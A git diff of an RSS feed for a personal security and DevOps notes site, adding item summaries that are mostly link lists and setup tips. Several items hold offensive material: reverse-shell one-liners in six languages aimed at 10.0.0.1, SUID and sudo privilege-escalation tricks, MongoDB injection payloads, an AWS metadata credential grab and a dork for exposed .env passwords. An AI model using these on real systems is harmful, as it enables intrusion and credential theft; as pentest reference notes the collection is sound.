@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Tags on d47zm3</title>
+    <title>d47zm3</title>
     <link>https://d47zm3.me/tags/</link>
-    <description>Recent content in Tags on d47zm3</description>
+    <description>Recent content on d47zm3</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <lastBuildDate>Fri, 25 Jan 2019 15:11:00 +0100</lastBuildDate>
@@ -12,12 +12,714 @@
     
     
     <item>
-      <title></title>
-      <link>https://d47zm3.me/tags/</link>
+      <title>Bookmarks</title>
+      <link>https://d47zm3.me/bookmarks/</link>
       <pubDate>Fri, 25 Jan 2019 15:11:00 +0100</pubDate>
       
-      <guid>https://d47zm3.me/tags/</guid>
+      <guid>https://d47zm3.me/bookmarks/</guid>
+      <description>Exploit Writing  Corelan Tutorials
+ Linux (x86) Exploit Development Series
+ Learning Exploitation with Offensive Computer Security 2.0
+ Modern Binary Exploitation
+ Reverse Engineering 101
+ Stack Buffer Overflows: Linux - Chapter 1
+ Smashing The Stack For Fun And Profit
+  Courses and Labs  Labs for the Computer and Network Security Class
+ SANS Cyber Aces
+ Pentest Training
+ Hacking Lab
+ Learn Burp Suite</description>
+    </item>
+    
+    <item>
+      <title>AWS</title>
+      <link>https://d47zm3.me/resources/devops/aws/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/aws/</guid>
+      <description> Grant acces to your S3 bucket for other AWS account. { &amp;#34;Id&amp;#34;: &amp;#34;Policy1519815897918&amp;#34;, &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, &amp;#34;Statement&amp;#34;: [ { &amp;#34;Sid&amp;#34;: &amp;#34;Stmt1519815367664&amp;#34;, &amp;#34;Action&amp;#34;: &amp;#34;s3:*&amp;#34;, &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, &amp;#34;Resource&amp;#34;: &amp;#34;arn:aws:s3:::private-multimedia/*&amp;#34;, &amp;#34;Principal&amp;#34;: { &amp;#34;CanonicalUser&amp;#34;: &amp;#34;01b2fc158a01666bfb1b56da6ad958d3c6fe8702540de3af517106f9aca37766&amp;#34; } } ] }</description>
+    </item>
+    
+    <item>
+      <title>Becoming DevOps</title>
+      <link>https://d47zm3.me/resources/devops/becoming-devops/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/becoming-devops/</guid>
+      <description>A series of articles, how to become DevOps
+ https://medium.com/@devfire/how-to-become-a-devops-engineer-in-six-months-or-less-366097df7737  </description>
+    </item>
+    
+    <item>
+      <title>Blogs</title>
+      <link>https://d47zm3.me/resources/infosec/blogs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/blogs/</guid>
+      <description> Blogs worth reading.
+Links  https://rastamouse.me - hacking Windows  </description>
+    </item>
+    
+    <item>
+      <title>Bug Bounty</title>
+      <link>https://d47zm3.me/resources/infosec/bugbounty/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/bugbounty/</guid>
+      <description>Communities Bug Bounty Notes - founded by zseano, challenges, writeups, etc.
+Bug Bounty Tips  nmap --script &amp;quot;http-*&amp;quot; IP/target - will run 30+ scripts related to HTTP, SQLInjection, config backup checks, checkout more at the docs http://nmap.org/nsedoc  Files To Look Out For  .git/config
+ .travis.yml
+ Makefile
+ Dockerfile
+ package.json
+ gulpfile.js
+ composer.json
+ web.config
+ .env
+  Need execute some command but &amp;ldquo;space&amp;rdquo; is blocked?</description>
+    </item>
+    
+    <item>
+      <title>Burp Suite Proxy</title>
+      <link>https://d47zm3.me/resources/infosec/burp-suite-proxy/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/burp-suite-proxy/</guid>
+      <description> Famous tool for Web Application Security.
+Links  Burp Suite Pro Tricks &amp;amp; Tips  </description>
+    </item>
+    
+    <item>
+      <title>CTFs</title>
+      <link>https://d47zm3.me/resources/infosec/ctfs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/ctfs/</guid>
+      <description> Links  https://github.com/ctfs/ - lots of writeups  </description>
+    </item>
+    
+    <item>
+      <title>Cloud Security</title>
+      <link>https://d47zm3.me/resources/infosec/cloud-security/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/cloud-security/</guid>
+      <description>Grab IAM Role Keys - AWS curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ Security Audit Tools  ScoutSuite  All-In-One Wiki for Cloud Penetration Testing Source: https://www.peerlyst.com/posts/all-in-one-wiki-for-cloud-penetration-testing-nitesh-malviya
+ Links and Resources for Cloud basics
+ Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/
+ SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud
+  AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/
+ Links and Resources for AWS Pentesting
+ https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/
+ https://www.provensec.com/penetration-testing-aws-s3-bucket/
+ Rhinosecuritylabs links - https://rhinosecuritylabs.com/blog/?category=aws - check all the links.</description>
+    </item>
+    
+    <item>
+      <title>Code</title>
+      <link>https://d47zm3.me/resources/code/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/code/</guid>
       <description></description>
+    </item>
+    
+    <item>
+      <title>Code</title>
+      <link>https://d47zm3.me/resources/code/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/code/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Conference Video Archives</title>
+      <link>https://d47zm3.me/resources/infosec/conference-video-archives/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/conference-video-archives/</guid>
+      <description> Great site with archived content from various conferences around the world, as well as podcasts and documents.
+Links  InfoCon  </description>
+    </item>
+    
+    <item>
+      <title>Cryptography</title>
+      <link>https://d47zm3.me/resources/infosec/cryptography/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/cryptography/</guid>
+      <description> Courses  Introduction to Cryptography by Christof Paar  </description>
+    </item>
+    
+    <item>
+      <title>DevOps</title>
+      <link>https://d47zm3.me/resources/devops/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>DevOps</title>
+      <link>https://d47zm3.me/resources/devops/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Environment</title>
+      <link>https://d47zm3.me/resources/environment/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Environment</title>
+      <link>https://d47zm3.me/resources/environment/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Exploits</title>
+      <link>https://d47zm3.me/resources/infosec/exploits/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/exploits/</guid>
+      <description> Write-ups and such of more famous exploits.
+dity_sock  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  runc - cve-2019-5736  https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html  </description>
+    </item>
+    
+    <item>
+      <title>GPG</title>
+      <link>https://d47zm3.me/resources/environment/gpg/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/gpg/</guid>
+      <description>Set up GPG on computer to encrypt data &amp;amp; sign commits etc.
+MacOS Guide ~&amp;gt; brew install gnupg pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg-agent.conf # Connects gpg-agent to the OSX keychain via the brew-installed # pinentry program from GPGtools. This is the OSX &amp;#39;magic sauce&amp;#39;, # allowing the gpg key&amp;#39;s passphrase to be stored in the login # keychain, enabling automatic key signing. pinentry-program /usr/local/bin/pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg.conf # Uncomment within config (or add this line) use-agent no-tty # This silences the &amp;#34;you need a passphrase&amp;#34; message once the passphrase handling is all set.</description>
+    </item>
+    
+    <item>
+      <title>Golang</title>
+      <link>https://d47zm3.me/resources/code/golang/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/code/golang/</guid>
+      <description>Golang Courses Gopher Guides - nice site with free video courses
+Tricks  Shrink Go Binaries Up to 7 times!  # -s and -w flags $ GOOS=linux go build cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 12493536 Apr 16 16:58 go $ GOOS=linux go build -ldflags=&amp;#34;-s -w&amp;#34; cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 8941952 Apr 16 17:08 go # upx $ GOOS=linux go build cmd/go $ ls -l go -rwxr-xr-x 1 filippo staff 12493536 Apr 16 16:58 go $ upx --brute go Ultimate Packer for eXecutables Copyright (C) 1996 - 2013 UPX 3.</description>
+    </item>
+    
+    <item>
+      <title>Google Dorks</title>
+      <link>https://d47zm3.me/resources/infosec/google-dorks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/google-dorks/</guid>
+      <description> Links  500 pages PDF of dorks  Dorks  https://www.google.com/search?q=db_password+filetype%3Aenv - env files  </description>
+    </item>
+    
+    <item>
+      <title>Hacking Learning Platforms</title>
+      <link>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</guid>
+      <description> Things you can hack for (free) &amp;amp; legally
+Online Labs  Hack The Box
+ Hacking Lab
+ Pwnable.KR
+ Root-Me
+ Practical Pentest Labs
+ Rozwal.To
+  Vulnerable Applications To Deploy Yourself] OWASP Juice Shop
+Miscellaneous  Mind Map - lots of links
+ List of Hacking - source: https://www.blackroomsec.com/updated-hacking-challenge-site-links/
+  </description>
+    </item>
+    
+    <item>
+      <title>Infosec</title>
+      <link>https://d47zm3.me/resources/infosec/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Infosec</title>
+      <link>https://d47zm3.me/resources/infosec/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Kubernetes</title>
+      <link>https://d47zm3.me/resources/devops/kubernetes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/kubernetes/</guid>
+      <description>Everything related to Kubernetes.
+Interesting Sites  Official Docs - best resource for Kubernetes
+ Kubedex - great blog with posts on Kubernetes subjects, comparing solutions etc.
+ Inguardians - blog from redteamers about hacking &amp;amp; securing kubernetes
+ 50 useful Kubernetes tools
+  Customization, Service Mesh, gRPC (more advanced stuff) Kustomization  Kustomize: Deploy Your App with Template Free YAML - Ryan Cox, Lyft
+ Kustomize: Kubernetes Configuration Customization - K8s, Kustomize &amp;amp; Ship SF Meetup</description>
+    </item>
+    
+    <item>
+      <title>Linux Network Monitoring Tools</title>
+      <link>https://d47zm3.me/resources/devops/linux-network-monitoring-tools/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/linux-network-monitoring-tools/</guid>
+      <description>Original Link: https://haydenjames.io/linux-networking-commands-scripts/
+ arpwatch – ethernet activity monitor. bmon – bandwidth monitor and rate estimator. bwm-ng – live network bandwidth monitor. curl – transferring data with urls. darkstat – captures network traffic, usage statistics. dhclient – dynamic host configuration protocol client dig – query dns servers for information. dstat – replacement for vmstat, iostat, mpstat, netstat and ifstat. ethtool – utility for controlling network drivers and hardware. ftp – simplest file transfer protocol.</description>
+    </item>
+    
+    <item>
+      <title>Linux Privilege Escalation</title>
+      <link>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</guid>
+      <description>MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
+select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them find / -user root -perm -4000 -print 2&amp;gt;/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c &amp;#34;import pty; pty.</description>
+    </item>
+    
+    <item>
+      <title>Mobile Pentesting</title>
+      <link>https://d47zm3.me/resources/infosec/mobile-pentesting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/mobile-pentesting/</guid>
+      <description> Breaking security on phones.
+Sites  Hot and fresh guide from OWASP for iOS and Android available here.
+ iOS App Security, Penetration Testing, and Development - nice blog on iOS security
+  </description>
+    </item>
+    
+    <item>
+      <title>No-SQL Injection</title>
+      <link>https://d47zm3.me/resources/infosec/no-sql-injection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/no-sql-injection/</guid>
+      <description>MongoDB login bypass We can also try to insert $ge instead of $ne operator and try to inject these instead of index names (username/password).
+MongoDB injections true, $where: &amp;#39;1 == 1&amp;#39; , $where: &amp;#39;1 == 1&amp;#39; $where: &amp;#39;1 == 1&amp;#39; &amp;#39;, $where: &amp;#39;1 == 1&amp;#39; 1, $where: &amp;#39;1 == 1&amp;#39; { $ne: 1 } &amp;#39;, $or: [ {}, { &amp;#39;a&amp;#39;:&amp;#39;a &amp;#39; } ], $comment:&amp;#39;successful MongoDB injection&amp;#39; db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 &amp;#39; &amp;amp;&amp;amp; this.</description>
+    </item>
+    
+    <item>
+      <title>OSINT</title>
+      <link>https://d47zm3.me/resources/infosec/osint/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/osint/</guid>
+      <description> Everything related to Open Source Intelligence.
+Search Engines  censys
+ shodan
+ greynoise
+ zoomeye
+ grayhatwarfare
+ hunter.io
+ binaryedge
+ crt.sh
+ dnsdumpster
+ onyphe.io
+ fofa.so
+  </description>
+    </item>
+    
+    <item>
+      <title>Online Courses</title>
+      <link>https://d47zm3.me/resources/infosec/online-courses/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/online-courses/</guid>
+      <description> Google Docs Sheet with lots of links
+ The Big List Of Infosec Resources
+ NetSecFocus Resources
+  </description>
+    </item>
+    
+    <item>
+      <title>Open Redirects</title>
+      <link>https://d47zm3.me/resources/infosec/open-redirects/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/open-redirects/</guid>
+      <description> Same Open Redirect vulnerability won&amp;rsquo;t make it.
+Links  Open URL redirects to grab FB OAuth Tokens
+ Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)
+ Open Redirect on central.uber.com allows for account takeover
+ hackerone.com/reports/206591
+  </description>
+    </item>
+    
+    <item>
+      <title>PKI</title>
+      <link>https://d47zm3.me/resources/devops/pki/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/pki/</guid>
+      <description>Based on great article here, just my notes and highlighted fragments. Taken from article https://smallstep.com/blog/everything-pki.html
+TLDR: The goal of certificates and PKI is to bind names to public keys.
+Terms like entity, identity, identifier, name, subscriber, end entity, certificate authority, root certificates, leaf certificates (these belong to end entities), relying party ( a certificate user that verifies and trusts certificates issued by a CA )
+A message authentication code (MAC) is a bit of data that’s used to verify which entity sent a message, and to ensure that a message hasn’t been modified.</description>
+    </item>
+    
+    <item>
+      <title>Padding Oracle Attack</title>
+      <link>https://d47zm3.me/resources/infosec/padding-oracle-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/padding-oracle-attack/</guid>
+      <description>Performing Padding Oracle Attack using padBuster.
+Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &amp;#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&amp;#34; 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.</description>
+    </item>
+    
+    <item>
+      <title>Passwords</title>
+      <link>https://d47zm3.me/resources/infosec/passwords/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/passwords/</guid>
+      <description> Password Search Engines  gotcha.pw
+ haveibeenpwned.com
+ vigilante.pw
+  Wordlists and Weak Password  https://github.com/berzerk0/Probable-Wordlists
+ https://github.com/danielmiessler/SecLists
+ https://hashes.org
+ https://weakpass.com
+  Cracking Hashes Online  https://crackstation.net
+ https://hashkiller.co.uk/md5-decrypter.aspx
+  </description>
+    </item>
+    
+    <item>
+      <title>Payloads</title>
+      <link>https://d47zm3.me/resources/infosec/payloads/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/payloads/</guid>
+      <description> Links  payload collections  </description>
+    </item>
+    
+    <item>
+      <title>Personal Hacking Lab</title>
+      <link>https://d47zm3.me/resources/infosec/hacking-lab/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/hacking-lab/</guid>
+      <description> https://cyberx.tech/hacking-lab/
+ https://scriptdotsh.com/index.php/2018/06/09/active-directory-penetration-dojo-setup-of-ad-penetration-lab-part-1/
+  </description>
+    </item>
+    
+    <item>
+      <title>Personal Security Checklist</title>
+      <link>https://d47zm3.me/resources/infosec/personal-security-checklist/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/personal-security-checklist/</guid>
+      <description>Be safe on the internet - An open source checklist of resources designed to improve your online privacy and security. Check things off to keep track as you go.
+Protect Yourself @StartPageSearch @MyStartMail @DuckDuckGo @ProtonMail
+@torproject @TorTorbrowser
+@expressvpn @NordVPN @ProtonVPN
+@HTTPSEverywhere @uMatrix @ublockorigin</description>
+    </item>
+    
+    <item>
+      <title>Protecting Remote Server</title>
+      <link>https://d47zm3.me/resources/environment/protecting-remote-server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/protecting-remote-server/</guid>
+      <description>Tips to protect remote server after fresh install, first thing you want to do is to update all packages and reboot system to apply kernel patches.
+~&amp;gt; apt update &amp;amp;&amp;amp; apt upgrade -y Then disable logging in with cleartext passwords
+~&amp;gt; vi /etc/ssh/sshd_config # PermitRootLogin (yes) =&amp;gt; (without-password|no) # PasswordAuthentication no ~&amp;gt; systemctl restart sshd Install Fail2Ban and create SSHD jail
+~&amp;gt; apt install fail2ban ~&amp;gt; cat /etc/fail2ban/jail.d/defaults-debian.conf [11:22:10] [sshd] enabled = true port = ssh filter = sshd logpath = /var/log/auth.</description>
+    </item>
+    
+    <item>
+      <title>Python</title>
+      <link>https://d47zm3.me/resources/code/python/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/code/python/</guid>
+      <description>Styling Guide (PEP8) You can read it here. To start following it, install locally pycodestyle package and run it through your code.
+~&amp;gt; pip install pycodestyle ~&amp;gt; pycodestyle --ignore=E501 run.py run.py:15:1: E302 expected 2 blank lines, found 1# main parser = argparse.ArgumentParser() parser.add_argument(&amp;#34;action&amp;#34;, choices=[&amp;#39;list&amp;#39;, &amp;#39;add&amp;#39;, &amp;#39;search&amp;#39;, &amp;#39;import&amp;#39;], help=&amp;#34;list local repositories, add new one or search by tags&amp;#34;) parser.add_argument(&amp;#34;--url&amp;#34;, nargs=&amp;#39;?&amp;#39;, help=&amp;#34;url of repository to add&amp;#34;) parser.add_argument(&amp;#34;--note&amp;#34;, nargs=&amp;#39;?&amp;#39;, help=&amp;#34;personal note about repository&amp;#34;) parser.</description>
+    </item>
+    
+    <item>
+      <title>Reconnaissance</title>
+      <link>https://d47zm3.me/resources/infosec/reconnaissance/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/reconnaissance/</guid>
+      <description>Everything from port scanning, to service mapping, passive OSINT etc.
+Presentations  Recon Like a Boss
+ Visual Guide to Recon
+  Links  Assesments Mindset  Subdomain Discovery  curl &#39;https://crt.sh/?q=%.example.org&#39; | grep &amp;quot;http://example.org &amp;quot; | cut -d &#39;&amp;gt;&#39; -f2 | cut -d &#39;&amp;lt;&#39; -f1 | grep -v &amp;quot; &amp;quot; | sort -u  DNS Checking who can issue certificate for domain
+dig @nameserver record.com CAA GeoIP Lookup</description>
+    </item>
+    
+    <item>
+      <title>Red Team</title>
+      <link>https://d47zm3.me/resources/infosec/redteam/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/redteam/</guid>
+      <description> Articles  Obfuscation Techniques used in Phishing Attacks  </description>
+    </item>
+    
+    <item>
+      <title>Resources</title>
+      <link>https://d47zm3.me/resources/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/</guid>
+      <description>Content is being divided.</description>
+    </item>
+    
+    <item>
+      <title>Reverse Engineering</title>
+      <link>https://d47zm3.me/resources/infosec/reverse-engineering/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/reverse-engineering/</guid>
+      <description> Challenges  https://crackmes.one
+ https://challenges.re
+   Training  https://recon.cx/2015/training.html
+ http://index-of.es
+ https://github.com/wtsxDev/reverse-engineering
+ intro to ctf reverse engineering
+  </description>
+    </item>
+    
+    <item>
+      <title>Reverse Shells</title>
+      <link>https://d47zm3.me/resources/infosec/reverse-shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/reverse-shells/</guid>
+      <description>Reverse shells in various languages/platforms.
+# bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 # perl perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; # python python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; # php php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; # ruby ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f # java r = Runtime.getRuntime() p = r.</description>
+    </item>
+    
+    <item>
+      <title>Secrets Dumping</title>
+      <link>https://d47zm3.me/resources/infosec/secrets-dumping/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/secrets-dumping/</guid>
+      <description>Hunt for secret in repositories/source code/disk.
+GitHub Secret Leaks:
+ https://github.com/zricethezav/gitleaks
+ https://github.com/anshumanbh/git-all-secrets
+ https://github.com/Hell0W0rld0/Github-Hunter
+  </description>
+    </item>
+    
+    <item>
+      <title>Shells</title>
+      <link>https://d47zm3.me/resources/environment/shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/shells/</guid>
+      <description>From my experience two shells that are worth notice are
+ ZSH Fish  In practice though, you can achieve Fish features installing particular plugins for ZSH, and yet, ZSH will still be more compatible with Bash, while Fish introduces it&amp;rsquo;s own syntax and quirks, which may be hard to adapt after long years with Bash/ZSH. Yet, still I find it very nice as out-of-box solution. Two very well known plugin packages for ZSH are</description>
+    </item>
+    
+    <item>
+      <title>Social Engineering</title>
+      <link>https://d47zm3.me/resources/infosec/social-engineering/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/social-engineering/</guid>
+      <description> Also known as human hacking.
+Links  SE Basics  </description>
+    </item>
+    
+    <item>
+      <title>Static Code Analysis</title>
+      <link>https://d47zm3.me/resources/infosec/static-code-analysis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/static-code-analysis/</guid>
+      <description> Performing static code analysis in order to find weak points.
+Articles  great article from @bl4de on that subject
+ another article from AppSecco
+  Tools  relative-url-extractor
+ waybackurls
+ trufflehog
+ eslint + security rules (node for example or angular)
+ linkfinder
+ nodejsscan
+ retire.js
+ awesome-static-analysis
+  </description>
+    </item>
+    
+    <item>
+      <title>TMUX</title>
+      <link>https://d47zm3.me/resources/environment/tmux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/tmux/</guid>
+      <description>Another tool I can&amp;rsquo;t live without. Available here and in various package repositories on most distribtuons. Where do I start&amp;hellip; Maintain multiple terminals with ease, split screen in as many parts, as you want, make nice toolbars with information, and most motable, attach and detach your work from any place (assuming you work on remote machine). It also supports plugins, but again, I&amp;rsquo;m using very little of them and just roll with my configuration and some plugin to help me see battery status in terminal and for logging, maintained by TPM.</description>
+    </item>
+    
+    <item>
+      <title>Tools</title>
+      <link>https://d47zm3.me/resources/devops/tools/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/tools/</guid>
+      <description>Generic page for interesting, useful tools, not really fitting into other category:
+ mkcert - local TLS certificates with green lock via your own CA installed on system  </description>
+    </item>
+    
+    <item>
+      <title>Tricks</title>
+      <link>https://d47zm3.me/resources/devops/tricks/</link>
